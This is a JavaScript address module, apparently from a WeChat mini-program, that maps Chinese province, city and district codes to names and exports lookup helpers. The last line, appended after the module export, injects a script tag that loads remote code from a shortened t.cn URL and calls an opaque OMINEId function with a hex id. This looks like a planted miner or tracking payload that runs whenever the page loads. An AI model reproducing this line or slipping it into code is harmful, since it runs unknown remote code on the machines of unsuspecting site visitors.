  var _thisApp = getApp();
  var $ = _thisApp.requirejs("jquery");
  var DISTRICT = _thisApp.requirejs("address/district");
  var hash = {};
  var all_Areas=[];
  var recursion = function (data) {
    $.each(data, function (index, value) {
      hash[value['code']] = {
        name: value['name'],
        cell: value['cell'],
        index: index
      };
      if (value.cell){
        recursion(value.cell);
      }
    });   
  };
var forArray=function(data){
    var array=[];
    $.each(data,function(index,value){
      var item=[];    
      if(value.cell){
         $.each(value.cell,function(ind,val){  
           var item_item=[];     
           if(val.cell){
              $.each(val.cell,function(idx,vle){
                item_item.push({ "name": vle.name, "code": vle.code });
              });
           }

           item.push({ "name": val.name, "code": val.code, area: item_item});
         });
         
      }
      array.push({"name": value.name, code: value.code, city:item});
    });
    return array;
};
  recursion(DISTRICT);
  all_Areas= forArray(DISTRICT);
 // console.log(all_Areas);
  var address= {
    DISTRICT: DISTRICT,
    all_Areas: all_Areas,
    getData: function (code) {
      code = String(code);
      var array = [];
      var province_code = code.substr(0, 2) + '0000';
      if (hash[province_code]) {
        array.push(hash[province_code].name);
        if (province_code === code) {
          return array
        }
      }
      var city_code = code.substr(0, 4) + '00';
      if (hash[city_code]) {
        array.push(hash[city_code].name);
        if (city_code === code) {
          return array
        }
      }
      var area_code = code;
      if (hash[area_code]) {
        array.push(hash[area_code].name)
      }
      return array
    },
    getProvince: function (code) {
      code = String(code);
      var province_code = code.substr(0, 2) + '0000';
      return hash[province_code] ? hash[province_code] : false
    },
    getCity: function (code) {
      code = String(code);
      var city_code = code.substr(0, 4) + '00';
      return hash[city_code] ? hash[city_code] : false
    },
    getArea: function (code) {
      area_code = String(code);
      return hash[area_code] ? hash[area_code] : false
    }
  };
  module.exports = address;
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
